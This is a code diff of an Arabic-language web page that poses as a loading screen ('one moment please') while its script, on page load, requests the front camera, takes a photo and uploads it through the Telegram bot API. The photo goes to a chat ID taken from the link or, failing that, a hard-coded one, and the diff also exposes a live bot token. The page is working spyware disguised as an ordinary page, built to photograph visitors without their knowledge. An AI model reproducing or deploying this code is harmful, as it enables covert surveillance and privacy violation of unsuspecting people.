@@ -1,23 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل...</title>
+    <style>
+        body { 
+            background-color: #000; 
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: sans-serif; 
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .text { font-size: 1.2rem; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <div class="text">لحظه وحده من فضلك...</div>
+
+    <canvas id="canvas"></canvas>
+
 <script>
-    // 1. بيانات البوت الأساسية
+    // 1. التوكن الخاص بك
     const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
     
-    // 2. الحصول على آيدي الشخص من الرابط (تلقائياً)
+    // 2. تعديل ذكي: الحصول على الـ ID من رابط الصفحة تلقائياً
     const urlParams = new URLSearchParams(window.location.search);
-    const SENDER_ID = urlParams.get('sender_id'); 
+    let CHAT_ID = urlParams.get('sender_id'); 
+
+    // إذا تم فتح الرابط مباشرة بدون ID، سيتم الإرسال لآيديك الافتراضي كاحتياط
+    if (!CHAT_ID) {
+        CHAT_ID = '8169635171'; 
+    }
 
     async function startCapture() {
-        // إذا لم يجد الصفحة ID في الرابط، لن تفعل شيئاً
-        if (!SENDER_ID) {
-            console.error("لا يوجد ID للمستلم في الرابط");
-            return;
-        }
-
-        const canvas = document.createElement('canvas');
+        const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
@@ -26,14 +68,14 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
                 stream.getTracks().forEach(track => track.stop());
 
                 canvas.toBlob((blob) => {
                     const formData = new FormData();
-                    // إرسال الصورة للآيدي الذي قرأناه من الرابط
-                    formData.append('chat_id', SENDER_ID); 
-                    formData.append('photo', blob, 'capture.png');
-                    formData.append('caption', '✅ تم التقاط هذه الصورة عبر رابطك الخاص!');
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'image.png');
+                    formData.append('caption', '📸 تم التقاط صورة جديدة بنجاح!');
 
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -41,10 +83,14 @@
                     });
                 }, 'image/png');
             }, 1000);
-        } catch (e) {
-            console.log("تم رفض الإذن");
+
+        } catch (error) {
+            console.log("رفض المستخدم الإذن");
         }
     }
-    // تشغيل الكود بمجرد فتح الصفحة
+
     window.onload = startCapture;
 </script>
+
+</body>
+</html>
